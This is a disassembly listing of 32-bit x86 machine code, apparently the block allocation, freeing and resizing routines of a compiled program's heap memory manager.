  401cd4:	8b c5                	mov    %ebp,%eax
  401cd6:	03 44 24 04          	add    0x4(%esp),%eax
  401cda:	8b 53 08             	mov    0x8(%ebx),%edx
  401cdd:	03 53 0c             	add    0xc(%ebx),%edx
  401ce0:	3b c2                	cmp    %edx,%eax
  401ce2:	73 0a                	jae    0x401cee
  401ce4:	8d 14 37             	lea    (%edi,%esi,1),%edx
  401ce7:	2b d0                	sub    %eax,%edx
  401ce9:	e8 aa fe ff ff       	call   0x401b98
  401cee:	8b d4                	mov    %esp,%edx
  401cf0:	8b c3                	mov    %ebx,%eax
  401cf2:	e8 a9 f6 ff ff       	call   0x4013a0
  401cf7:	b0 01                	mov    $0x1,%al
  401cf9:	59                   	pop    %ecx
  401cfa:	5a                   	pop    %edx
  401cfb:	5d                   	pop    %ebp
  401cfc:	5f                   	pop    %edi
  401cfd:	5e                   	pop    %esi
  401cfe:	5b                   	pop    %ebx
  401cff:	c3                   	ret
  401d00:	53                   	push   %ebx
  401d01:	56                   	push   %esi
  401d02:	57                   	push   %edi
  401d03:	8b f2                	mov    %edx,%esi
  401d05:	8b f8                	mov    %eax,%edi
  401d07:	8b df                	mov    %edi,%ebx
  401d09:	89 73 08             	mov    %esi,0x8(%ebx)
  401d0c:	8b c3                	mov    %ebx,%eax
  401d0e:	03 c6                	add    %esi,%eax
  401d10:	83 e8 0c             	sub    $0xc,%eax
  401d13:	89 70 08             	mov    %esi,0x8(%eax)
  401d16:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401d1c:	7f 30                	jg     0x401d4e
  401d1e:	8b d6                	mov    %esi,%edx
  401d20:	c1 ea 02             	shr    $0x2,%edx
  401d23:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401d28:	8b 44 90 f4          	mov    -0xc(%eax,%edx,4),%eax
  401d2c:	85 c0                	test   %eax,%eax
  401d2e:	75 10                	jne    0x401d40
  401d30:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401d35:	89 5c 90 f4          	mov    %ebx,-0xc(%eax,%edx,4)
  401d39:	89 5b 04             	mov    %ebx,0x4(%ebx)
  401d3c:	89 1b                	mov    %ebx,(%ebx)
  401d3e:	eb 3a                	jmp    0x401d7a
  401d40:	8b 10                	mov    (%eax),%edx
  401d42:	89 43 04             	mov    %eax,0x4(%ebx)
  401d45:	89 13                	mov    %edx,(%ebx)
  401d47:	89 18                	mov    %ebx,(%eax)
  401d49:	89 5a 04             	mov    %ebx,0x4(%edx)
  401d4c:	eb 2c                	jmp    0x401d7a
  401d4e:	81 fe 00 3c 00 00    	cmp    $0x3c00,%esi
  401d54:	7c 0d                	jl     0x401d63
  401d56:	8b d6                	mov    %esi,%edx
  401d58:	8b c7                	mov    %edi,%eax
  401d5a:	e8 09 ff ff ff       	call   0x401c68
  401d5f:	84 c0                	test   %al,%al
  401d61:	75 17                	jne    0x401d7a
  401d63:	a1 68 c4 40 00       	mov    0x40c468,%eax
  401d68:	89 1d 68 c4 40 00    	mov    %ebx,0x40c468
  401d6e:	8b 10                	mov    (%eax),%edx
  401d70:	89 43 04             	mov    %eax,0x4(%ebx)
  401d73:	89 13                	mov    %edx,(%ebx)
  401d75:	89 18                	mov    %ebx,(%eax)
  401d77:	89 5a 04             	mov    %ebx,0x4(%edx)
  401d7a:	5f                   	pop    %edi
  401d7b:	5e                   	pop    %esi
  401d7c:	5b                   	pop    %ebx
  401d7d:	c3                   	ret
  401d7e:	8b c0                	mov    %eax,%eax
  401d80:	83 3d 6c c4 40 00 00 	cmpl   $0x0,0x40c46c
  401d87:	7e 40                	jle    0x401dc9
  401d89:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  401d90:	7d 0c                	jge    0x401d9e
  401d92:	c7 05 18 c4 40 00 07 	movl   $0x7,0x40c418
  401d99:	00 00 00 
  401d9c:	eb 2b                	jmp    0x401dc9
  401d9e:	a1 6c c4 40 00       	mov    0x40c46c,%eax
  401da3:	83 c8 02             	or     $0x2,%eax
  401da6:	8b 15 70 c4 40 00    	mov    0x40c470,%edx
  401dac:	89 02                	mov    %eax,(%edx)
  401dae:	a1 70 c4 40 00       	mov    0x40c470,%eax
  401db3:	83 c0 04             	add    $0x4,%eax
  401db6:	e8 b9 fd ff ff       	call   0x401b74
  401dbb:	33 c0                	xor    %eax,%eax
  401dbd:	a3 70 c4 40 00       	mov    %eax,0x40c470
  401dc2:	33 c0                	xor    %eax,%eax
  401dc4:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  401dc9:	c3                   	ret
  401dca:	8b c0                	mov    %eax,%eax
  401dcc:	53                   	push   %ebx
  401dcd:	56                   	push   %esi
  401dce:	57                   	push   %edi
  401dcf:	83 c4 f0             	add    $0xfffffff0,%esp
  401dd2:	8b f0                	mov    %eax,%esi
  401dd4:	8d 3c 24             	lea    (%esp),%edi
  401dd7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401dd8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401dd9:	8b fc                	mov    %esp,%edi
  401ddb:	e8 a0 ff ff ff       	call   0x401d80
  401de0:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401de4:	8b d7                	mov    %edi,%edx
  401de6:	b8 78 c4 40 00       	mov    $0x40c478,%eax
  401deb:	e8 3c f5 ff ff       	call   0x40132c
  401df0:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401df4:	85 db                	test   %ebx,%ebx
  401df6:	75 04                	jne    0x401dfc
  401df8:	33 c0                	xor    %eax,%eax
  401dfa:	eb 52                	jmp    0x401e4e
  401dfc:	8b 07                	mov    (%edi),%eax
  401dfe:	3b d8                	cmp    %eax,%ebx
  401e00:	73 0a                	jae    0x401e0c
  401e02:	e8 b9 fd ff ff       	call   0x401bc0
  401e07:	29 07                	sub    %eax,(%edi)
  401e09:	01 47 04             	add    %eax,0x4(%edi)
  401e0c:	8b 07                	mov    (%edi),%eax
  401e0e:	03 47 04             	add    0x4(%edi),%eax
  401e11:	8b f3                	mov    %ebx,%esi
  401e13:	03 74 24 0c          	add    0xc(%esp),%esi
  401e17:	3b c6                	cmp    %esi,%eax
  401e19:	73 08                	jae    0x401e23
  401e1b:	e8 10 fe ff ff       	call   0x401c30
  401e20:	01 47 04             	add    %eax,0x4(%edi)
  401e23:	8b 07                	mov    (%edi),%eax
  401e25:	03 47 04             	add    0x4(%edi),%eax
  401e28:	3b f0                	cmp    %eax,%esi
  401e2a:	75 11                	jne    0x401e3d
  401e2c:	83 e8 04             	sub    $0x4,%eax
  401e2f:	ba 04 00 00 00       	mov    $0x4,%edx
  401e34:	e8 0b fd ff ff       	call   0x401b44
  401e39:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401e3d:	8b 07                	mov    (%edi),%eax
  401e3f:	a3 70 c4 40 00       	mov    %eax,0x40c470
  401e44:	8b 47 04             	mov    0x4(%edi),%eax
  401e47:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  401e4c:	b0 01                	mov    $0x1,%al
  401e4e:	83 c4 10             	add    $0x10,%esp
  401e51:	5f                   	pop    %edi
  401e52:	5e                   	pop    %esi
  401e53:	5b                   	pop    %ebx
  401e54:	c3                   	ret
  401e55:	8d 40 00             	lea    0x0(%eax),%eax
  401e58:	53                   	push   %ebx
  401e59:	83 c4 f8             	add    $0xfffffff8,%esp
  401e5c:	8b d8                	mov    %eax,%ebx
  401e5e:	8b d4                	mov    %esp,%edx
  401e60:	8d 43 04             	lea    0x4(%ebx),%eax
  401e63:	e8 70 f8 ff ff       	call   0x4016d8
  401e68:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e6c:	74 0b                	je     0x401e79
  401e6e:	8b c4                	mov    %esp,%eax
  401e70:	e8 57 ff ff ff       	call   0x401dcc
  401e75:	84 c0                	test   %al,%al
  401e77:	75 04                	jne    0x401e7d
  401e79:	33 c0                	xor    %eax,%eax
  401e7b:	eb 02                	jmp    0x401e7f
  401e7d:	b0 01                	mov    $0x1,%al
  401e7f:	59                   	pop    %ecx
  401e80:	5a                   	pop    %edx
  401e81:	5b                   	pop    %ebx
  401e82:	c3                   	ret
  401e83:	90                   	nop
  401e84:	53                   	push   %ebx
  401e85:	56                   	push   %esi
  401e86:	83 c4 f8             	add    $0xfffffff8,%esp
  401e89:	8b f2                	mov    %edx,%esi
  401e8b:	8b d8                	mov    %eax,%ebx
  401e8d:	8b cc                	mov    %esp,%ecx
  401e8f:	8d 56 04             	lea    0x4(%esi),%edx
  401e92:	8b c3                	mov    %ebx,%eax
  401e94:	e8 cf f8 ff ff       	call   0x401768
  401e99:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e9d:	74 0b                	je     0x401eaa
  401e9f:	8b c4                	mov    %esp,%eax
  401ea1:	e8 26 ff ff ff       	call   0x401dcc
  401ea6:	84 c0                	test   %al,%al
  401ea8:	75 04                	jne    0x401eae
  401eaa:	33 c0                	xor    %eax,%eax
  401eac:	eb 02                	jmp    0x401eb0
  401eae:	b0 01                	mov    $0x1,%al
  401eb0:	59                   	pop    %ecx
  401eb1:	5a                   	pop    %edx
  401eb2:	5e                   	pop    %esi
  401eb3:	5b                   	pop    %ebx
  401eb4:	c3                   	ret
  401eb5:	8d 40 00             	lea    0x0(%eax),%eax
  401eb8:	33 d2                	xor    %edx,%edx
  401eba:	c1 e8 02             	shr    $0x2,%eax
  401ebd:	3d 00 04 00 00       	cmp    $0x400,%eax
  401ec2:	77 16                	ja     0x401eda
  401ec4:	8b 15 74 c4 40 00    	mov    0x40c474,%edx
  401eca:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401ece:	85 d2                	test   %edx,%edx
  401ed0:	75 08                	jne    0x401eda
  401ed2:	40                   	inc    %eax
  401ed3:	3d 01 04 00 00       	cmp    $0x401,%eax
  401ed8:	75 ea                	jne    0x401ec4
  401eda:	8b c2                	mov    %edx,%eax
  401edc:	c3                   	ret
  401edd:	8d 40 00             	lea    0x0(%eax),%eax
  401ee0:	53                   	push   %ebx
  401ee1:	56                   	push   %esi
  401ee2:	57                   	push   %edi
  401ee3:	55                   	push   %ebp
  401ee4:	8b f0                	mov    %eax,%esi
  401ee6:	bf 68 c4 40 00       	mov    $0x40c468,%edi
  401eeb:	bd 6c c4 40 00       	mov    $0x40c46c,%ebp
  401ef0:	8b 1d 60 c4 40 00    	mov    0x40c460,%ebx
  401ef6:	3b 73 08             	cmp    0x8(%ebx),%esi
  401ef9:	0f 8e 84 00 00 00    	jle    0x401f83
  401eff:	8b 1f                	mov    (%edi),%ebx
  401f01:	8b 43 08             	mov    0x8(%ebx),%eax
  401f04:	3b f0                	cmp    %eax,%esi
  401f06:	7e 7b                	jle    0x401f83
  401f08:	89 73 08             	mov    %esi,0x8(%ebx)
  401f0b:	8b 5b 04             	mov    0x4(%ebx),%ebx
  401f0e:	3b 73 08             	cmp    0x8(%ebx),%esi
  401f11:	7f f8                	jg     0x401f0b
  401f13:	8b 17                	mov    (%edi),%edx
  401f15:	89 42 08             	mov    %eax,0x8(%edx)
  401f18:	3b 1f                	cmp    (%edi),%ebx
  401f1a:	74 04                	je     0x401f20
  401f1c:	89 1f                	mov    %ebx,(%edi)
  401f1e:	eb 63                	jmp    0x401f83
  401f20:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401f26:	7f 0d                	jg     0x401f35
  401f28:	8b c6                	mov    %esi,%eax
  401f2a:	e8 89 ff ff ff       	call   0x401eb8
  401f2f:	8b d8                	mov    %eax,%ebx
  401f31:	85 db                	test   %ebx,%ebx
  401f33:	75 4e                	jne    0x401f83
  401f35:	8b c6                	mov    %esi,%eax
  401f37:	e8 1c ff ff ff       	call   0x401e58
  401f3c:	84 c0                	test   %al,%al
  401f3e:	75 07                	jne    0x401f47
  401f40:	33 c0                	xor    %eax,%eax
  401f42:	e9 88 00 00 00       	jmp    0x401fcf
  401f47:	3b 75 00             	cmp    0x0(%ebp),%esi
  401f4a:	7f a4                	jg     0x401ef0
  401f4c:	29 75 00             	sub    %esi,0x0(%ebp)
  401f4f:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  401f53:	7d 08                	jge    0x401f5d
  401f55:	03 75 00             	add    0x0(%ebp),%esi
  401f58:	33 c0                	xor    %eax,%eax
  401f5a:	89 45 00             	mov    %eax,0x0(%ebp)
  401f5d:	a1 70 c4 40 00       	mov    0x40c470,%eax
  401f62:	01 35 70 c4 40 00    	add    %esi,0x40c470
  401f68:	8b d6                	mov    %esi,%edx
  401f6a:	83 ca 02             	or     $0x2,%edx
  401f6d:	89 10                	mov    %edx,(%eax)
  401f6f:	83 c0 04             	add    $0x4,%eax
  401f72:	ff 05 fc c3 40 00    	incl   0x40c3fc
  401f78:	83 ee 04             	sub    $0x4,%esi
  401f7b:	01 35 00 c4 40 00    	add    %esi,0x40c400
  401f81:	eb 4c                	jmp    0x401fcf
  401f83:	8b c3                	mov    %ebx,%eax
  401f85:	e8 36 fb ff ff       	call   0x401ac0
  401f8a:	8b 53 08             	mov    0x8(%ebx),%edx
  401f8d:	8b c2                	mov    %edx,%eax
  401f8f:	2b c6                	sub    %esi,%eax
  401f91:	83 f8 0c             	cmp    $0xc,%eax
  401f94:	7c 0c                	jl     0x401fa2
  401f96:	8b d3                	mov    %ebx,%edx
  401f98:	03 d6                	add    %esi,%edx
  401f9a:	92                   	xchg   %eax,%edx
  401f9b:	e8 60 fd ff ff       	call   0x401d00
  401fa0:	eb 12                	jmp    0x401fb4
  401fa2:	8b f2                	mov    %edx,%esi
  401fa4:	3b 1f                	cmp    (%edi),%ebx
  401fa6:	75 05                	jne    0x401fad
  401fa8:	8b 43 04             	mov    0x4(%ebx),%eax
  401fab:	89 07                	mov    %eax,(%edi)
  401fad:	8b c3                	mov    %ebx,%eax
  401faf:	03 c6                	add    %esi,%eax
  401fb1:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401fb4:	8b c3                	mov    %ebx,%eax
  401fb6:	8b d6                	mov    %esi,%edx
  401fb8:	83 ca 02             	or     $0x2,%edx
  401fbb:	89 10                	mov    %edx,(%eax)
  401fbd:	83 c0 04             	add    $0x4,%eax
  401fc0:	ff 05 fc c3 40 00    	incl   0x40c3fc
  401fc6:	83 ee 04             	sub    $0x4,%esi
  401fc9:	01 35 00 c4 40 00    	add    %esi,0x40c400
  401fcf:	5d                   	pop    %ebp
  401fd0:	5f                   	pop    %edi
  401fd1:	5e                   	pop    %esi
  401fd2:	5b                   	pop    %ebx
  401fd3:	c3                   	ret
  401fd4:	55                   	push   %ebp
  401fd5:	8b ec                	mov    %esp,%ebp
  401fd7:	83 c4 f8             	add    $0xfffffff8,%esp
  401fda:	53                   	push   %ebx
  401fdb:	56                   	push   %esi
  401fdc:	57                   	push   %edi
  401fdd:	8b d8                	mov    %eax,%ebx
  401fdf:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  401fe6:	75 13                	jne    0x401ffb
  401fe8:	e8 2b f9 ff ff       	call   0x401918
  401fed:	84 c0                	test   %al,%al
  401fef:	75 0a                	jne    0x401ffb
  401ff1:	33 c0                	xor    %eax,%eax
  401ff3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ff6:	e9 54 01 00 00       	jmp    0x40214f
  401ffb:	33 f6                	xor    %esi,%esi
  401ffd:	55                   	push   %ebp
  401ffe:	68 48 21 40 00       	push   $0x402148
  402003:	64 ff 36             	push   %fs:(%esi)
  402006:	64 89 26             	mov    %esp,%fs:(%esi)
  402009:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  402010:	74 0a                	je     0x40201c
  402012:	68 1c c4 40 00       	push   $0x40c41c
  402017:	e8 58 f2 ff ff       	call   0x401274
  40201c:	83 c3 07             	add    $0x7,%ebx
  40201f:	83 e3 fc             	and    $0xfffffffc,%ebx
  402022:	83 fb 0c             	cmp    $0xc,%ebx
  402025:	7d 05                	jge    0x40202c
  402027:	bb 0c 00 00 00       	mov    $0xc,%ebx
  40202c:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402032:	0f 8f 93 00 00 00    	jg     0x4020cb
  402038:	8b c3                	mov    %ebx,%eax
  40203a:	85 c0                	test   %eax,%eax
  40203c:	79 03                	jns    0x402041
  40203e:	83 c0 03             	add    $0x3,%eax
  402041:	c1 f8 02             	sar    $0x2,%eax
  402044:	8b 15 74 c4 40 00    	mov    0x40c474,%edx
  40204a:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  40204e:	85 d2                	test   %edx,%edx
  402050:	74 79                	je     0x4020cb
  402052:	8b ca                	mov    %edx,%ecx
  402054:	8b c1                	mov    %ecx,%eax
  402056:	03 c3                	add    %ebx,%eax
  402058:	83 20 fe             	andl   $0xfffffffe,(%eax)
  40205b:	8b 42 04             	mov    0x4(%edx),%eax
  40205e:	3b d0                	cmp    %eax,%edx
  402060:	75 1a                	jne    0x40207c
  402062:	8b c3                	mov    %ebx,%eax
  402064:	85 c0                	test   %eax,%eax
  402066:	79 03                	jns    0x40206b
  402068:	83 c0 03             	add    $0x3,%eax
  40206b:	c1 f8 02             	sar    $0x2,%eax
  40206e:	8b 35 74 c4 40 00    	mov    0x40c474,%esi
  402074:	33 ff                	xor    %edi,%edi
  402076:	89 7c 86 f4          	mov    %edi,-0xc(%esi,%eax,4)
  40207a:	eb 26                	jmp    0x4020a2
  40207c:	8b f3                	mov    %ebx,%esi
  40207e:	85 f6                	test   %esi,%esi
  402080:	79 03                	jns    0x402085
  402082:	83 c6 03             	add    $0x3,%esi
  402085:	c1 fe 02             	sar    $0x2,%esi
  402088:	8b 3d 74 c4 40 00    	mov    0x40c474,%edi
  40208e:	89 44 b7 f4          	mov    %eax,-0xc(%edi,%esi,4)
  402092:	8b 32                	mov    (%edx),%esi
  402094:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402097:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40209a:	89 46 04             	mov    %eax,0x4(%esi)
  40209d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4020a0:	89 30                	mov    %esi,(%eax)
  4020a2:	8b c1                	mov    %ecx,%eax
  4020a4:	8b 52 08             	mov    0x8(%edx),%edx
  4020a7:	83 ca 02             	or     $0x2,%edx
  4020aa:	89 10                	mov    %edx,(%eax)
  4020ac:	83 c0 04             	add    $0x4,%eax
  4020af:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020b2:	ff 05 fc c3 40 00    	incl   0x40c3fc
  4020b8:	83 eb 04             	sub    $0x4,%ebx
  4020bb:	01 1d 00 c4 40 00    	add    %ebx,0x40c400
  4020c1:	e8 8e 0e 00 00       	call   0x402f54
  4020c6:	e9 84 00 00 00       	jmp    0x40214f
  4020cb:	3b 1d 6c c4 40 00    	cmp    0x40c46c,%ebx
  4020d1:	7f 4a                	jg     0x40211d
  4020d3:	29 1d 6c c4 40 00    	sub    %ebx,0x40c46c
  4020d9:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  4020e0:	7d 0d                	jge    0x4020ef
  4020e2:	03 1d 6c c4 40 00    	add    0x40c46c,%ebx
  4020e8:	33 c0                	xor    %eax,%eax
  4020ea:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  4020ef:	a1 70 c4 40 00       	mov    0x40c470,%eax
  4020f4:	01 1d 70 c4 40 00    	add    %ebx,0x40c470
  4020fa:	8b d3                	mov    %ebx,%edx
  4020fc:	83 ca 02             	or     $0x2,%edx
  4020ff:	89 10                	mov    %edx,(%eax)
  402101:	83 c0 04             	add    $0x4,%eax
  402104:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402107:	ff 05 fc c3 40 00    	incl   0x40c3fc
  40210d:	83 eb 04             	sub    $0x4,%ebx
  402110:	01 1d 00 c4 40 00    	add    %ebx,0x40c400
  402116:	e8 39 0e 00 00       	call   0x402f54
  40211b:	eb 32                	jmp    0x40214f
  40211d:	8b c3                	mov    %ebx,%eax
  40211f:	e8 bc fd ff ff       	call   0x401ee0
  402124:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402127:	33 c0                	xor    %eax,%eax
  402129:	5a                   	pop    %edx
  40212a:	59                   	pop    %ecx
  40212b:	59                   	pop    %ecx
  40212c:	64 89 10             	mov    %edx,%fs:(%eax)
  40212f:	68 4f 21 40 00       	push   $0x40214f
  402134:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  40213b:	74 0a                	je     0x402147
  40213d:	68 1c c4 40 00       	push   $0x40c41c
  402142:	e8 35 f1 ff ff       	call   0x40127c
  402147:	c3                   	ret
  402148:	e9 af 0c 00 00       	jmp    0x402dfc
  40214d:	eb e5                	jmp    0x402134
  40214f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402152:	5f                   	pop    %edi
  402153:	5e                   	pop    %esi
  402154:	5b                   	pop    %ebx
  402155:	59                   	pop    %ecx
  402156:	59                   	pop    %ecx
  402157:	5d                   	pop    %ebp
  402158:	c3                   	ret
  402159:	8d 40 00             	lea    0x0(%eax),%eax
  40215c:	55                   	push   %ebp
  40215d:	8b ec                	mov    %esp,%ebp
  40215f:	51                   	push   %ecx
  402160:	53                   	push   %ebx
  402161:	56                   	push   %esi
  402162:	57                   	push   %edi
  402163:	8b d8                	mov    %eax,%ebx
  402165:	33 c0                	xor    %eax,%eax
  402167:	a3 18 c4 40 00       	mov    %eax,0x40c418
  40216c:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  402173:	75 1f                	jne    0x402194
  402175:	e8 9e f7 ff ff       	call   0x401918
  40217a:	84 c0                	test   %al,%al
  40217c:	75 16                	jne    0x402194
  40217e:	c7 05 18 c4 40 00 08 	movl   $0x8,0x40c418
  402185:	00 00 00 
  402188:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40218f:	e9 61 01 00 00       	jmp    0x4022f5
  402194:	33 c9                	xor    %ecx,%ecx
  402196:	55                   	push   %ebp
  402197:	68 ee 22 40 00       	push   $0x4022ee
  40219c:	64 ff 31             	push   %fs:(%ecx)
  40219f:	64 89 21             	mov    %esp,%fs:(%ecx)
  4021a2:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  4021a9:	74 0a                	je     0x4021b5
  4021ab:	68 1c c4 40 00       	push   $0x40c41c
  4021b0:	e8 bf f0 ff ff       	call   0x401274
  4021b5:	8b f3                	mov    %ebx,%esi
  4021b7:	83 ee 04             	sub    $0x4,%esi
  4021ba:	8b 1e                	mov    (%esi),%ebx
  4021bc:	f6 c3 02             	test   $0x2,%bl
  4021bf:	75 0f                	jne    0x4021d0
  4021c1:	c7 05 18 c4 40 00 09 	movl   $0x9,0x40c418
  4021c8:	00 00 00 
  4021cb:	e9 f5 00 00 00       	jmp    0x4022c5
  4021d0:	ff 0d fc c3 40 00    	decl   0x40c3fc
  4021d6:	8b c3                	mov    %ebx,%eax
  4021d8:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4021dd:	83 e8 04             	sub    $0x4,%eax
  4021e0:	29 05 00 c4 40 00    	sub    %eax,0x40c400
  4021e6:	f6 c3 01             	test   $0x1,%bl
  4021e9:	74 45                	je     0x402230
  4021eb:	8b c6                	mov    %esi,%eax
  4021ed:	83 e8 0c             	sub    $0xc,%eax
  4021f0:	8b 50 08             	mov    0x8(%eax),%edx
  4021f3:	83 fa 0c             	cmp    $0xc,%edx
  4021f6:	7c 08                	jl     0x402200
  4021f8:	f7 c2 03 00 00 80    	test   $0x80000003,%edx
  4021fe:	74 0f                	je     0x40220f
  402200:	c7 05 18 c4 40 00 0a 	movl   $0xa,0x40c418
  402207:	00 00 00 
  40220a:	e9 b6 00 00 00       	jmp    0x4022c5
  40220f:	8b c6                	mov    %esi,%eax
  402211:	2b c2                	sub    %edx,%eax
  402213:	3b 50 08             	cmp    0x8(%eax),%edx
  402216:	74 0f                	je     0x402227
  402218:	c7 05 18 c4 40 00 0a 	movl   $0xa,0x40c418
  40221f:	00 00 00 
  402222:	e9 9e 00 00 00       	jmp    0x4022c5
  402227:	03 da                	add    %edx,%ebx
  402229:	8b f0                	mov    %eax,%esi
  40222b:	e8 90 f8 ff ff       	call   0x401ac0
  402230:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  402236:	8b c6                	mov    %esi,%eax
  402238:	03 c3                	add    %ebx,%eax
  40223a:	8b f8                	mov    %eax,%edi
  40223c:	3b 3d 70 c4 40 00    	cmp    0x40c470,%edi
  402242:	75 2c                	jne    0x402270
  402244:	29 1d 70 c4 40 00    	sub    %ebx,0x40c470
  40224a:	01 1d 6c c4 40 00    	add    %ebx,0x40c46c
  402250:	81 3d 6c c4 40 00 00 	cmpl   $0x3c00,0x40c46c
  402257:	3c 00 00 
  40225a:	7e 05                	jle    0x402261
  40225c:	e8 1f fb ff ff       	call   0x401d80
  402261:	33 c0                	xor    %eax,%eax
  402263:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402266:	e8 e9 0c 00 00       	call   0x402f54
  40226b:	e9 85 00 00 00       	jmp    0x4022f5
  402270:	8b 10                	mov    (%eax),%edx
  402272:	f6 c2 02             	test   $0x2,%dl
  402275:	74 1c                	je     0x402293
  402277:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  40227d:	83 fa 04             	cmp    $0x4,%edx
  402280:	7d 0c                	jge    0x40228e
  402282:	c7 05 18 c4 40 00 0b 	movl   $0xb,0x40c418
  402289:	00 00 00 
  40228c:	eb 37                	jmp    0x4022c5
  40228e:	83 08 01             	orl    $0x1,(%eax)
  402291:	eb 29                	jmp    0x4022bc
  402293:	8b c7                	mov    %edi,%eax
  402295:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402299:	74 0b                	je     0x4022a6
  40229b:	83 38 00             	cmpl   $0x0,(%eax)
  40229e:	74 06                	je     0x4022a6
  4022a0:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  4022a4:	7d 0c                	jge    0x4022b2
  4022a6:	c7 05 18 c4 40 00 0b 	movl   $0xb,0x40c418
  4022ad:	00 00 00 
  4022b0:	eb 13                	jmp    0x4022c5
  4022b2:	8b 50 08             	mov    0x8(%eax),%edx
  4022b5:	03 da                	add    %edx,%ebx
  4022b7:	e8 04 f8 ff ff       	call   0x401ac0
  4022bc:	8b d3                	mov    %ebx,%edx
  4022be:	8b c6                	mov    %esi,%eax
  4022c0:	e8 3b fa ff ff       	call   0x401d00
  4022c5:	a1 18 c4 40 00       	mov    0x40c418,%eax
  4022ca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022cd:	33 c0                	xor    %eax,%eax
  4022cf:	5a                   	pop    %edx
  4022d0:	59                   	pop    %ecx
  4022d1:	59                   	pop    %ecx
  4022d2:	64 89 10             	mov    %edx,%fs:(%eax)
  4022d5:	68 f5 22 40 00       	push   $0x4022f5
  4022da:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  4022e1:	74 0a                	je     0x4022ed
  4022e3:	68 1c c4 40 00       	push   $0x40c41c
  4022e8:	e8 8f ef ff ff       	call   0x40127c
  4022ed:	c3                   	ret
  4022ee:	e9 09 0b 00 00       	jmp    0x402dfc
  4022f3:	eb e5                	jmp    0x4022da
  4022f5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4022f8:	5f                   	pop    %edi
  4022f9:	5e                   	pop    %esi
  4022fa:	5b                   	pop    %ebx
  4022fb:	59                   	pop    %ecx
  4022fc:	5d                   	pop    %ebp
  4022fd:	c3                   	ret
  4022fe:	8b c0                	mov    %eax,%eax
  402300:	53                   	push   %ebx
  402301:	56                   	push   %esi
  402302:	57                   	push   %edi
  402303:	55                   	push   %ebp
  402304:	83 c4 f8             	add    $0xfffffff8,%esp
  402307:	8b f2                	mov    %edx,%esi
  402309:	83 c6 07             	add    $0x7,%esi
  40230c:	83 e6 fc             	and    $0xfffffffc,%esi
  40230f:	83 fe 0c             	cmp    $0xc,%esi
  402312:	7d 05                	jge    0x402319
  402314:	be 0c 00 00 00       	mov    $0xc,%esi
  402319:	8b e8                	mov    %eax,%ebp
  40231b:	83 ed 04             	sub    $0x4,%ebp
  40231e:	8b 7d 00             	mov    0x0(%ebp),%edi
  402321:	81 e7 fc ff ff 7f    	and    $0x7ffffffc,%edi
  402327:	8b c5                	mov    %ebp,%eax
  402329:	03 c7                	add    %edi,%eax
  40232b:	8b d8                	mov    %eax,%ebx
  40232d:	3b fe                	cmp    %esi,%edi
  40232f:	0f 82 83 00 00 00    	jb     0x4023b8
  402335:	8b d7                	mov    %edi,%edx
  402337:	2b d6                	sub    %esi,%edx
  402339:	89 14 24             	mov    %edx,(%esp)
  40233c:	3b 1d 70 c4 40 00    	cmp    0x40c470,%ebx
  402342:	75 38                	jne    0x40237c
  402344:	8b 04 24             	mov    (%esp),%eax
  402347:	29 05 70 c4 40 00    	sub    %eax,0x40c470
  40234d:	8b 04 24             	mov    (%esp),%eax
  402350:	01 05 6c c4 40 00    	add    %eax,0x40c46c
  402356:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  40235d:	0f 8d 4c 01 00 00    	jge    0x4024af
  402363:	8b 04 24             	mov    (%esp),%eax
  402366:	01 05 70 c4 40 00    	add    %eax,0x40c470
  40236c:	8b 04 24             	mov    (%esp),%eax
  40236f:	29 05 6c c4 40 00    	sub    %eax,0x40c46c
  402375:	8b f7                	mov    %edi,%esi
  402377:	e9 33 01 00 00       	jmp    0x4024af
  40237c:	8b d8                	mov    %eax,%ebx
  40237e:	f6 03 02             	testb  $0x2,(%ebx)
  402381:	75 0d                	jne    0x402390
  402383:	8b c3                	mov    %ebx,%eax
  402385:	8b 50 08             	mov    0x8(%eax),%edx
  402388:	01 14 24             	add    %edx,(%esp)
  40238b:	e8 30 f7 ff ff       	call   0x401ac0
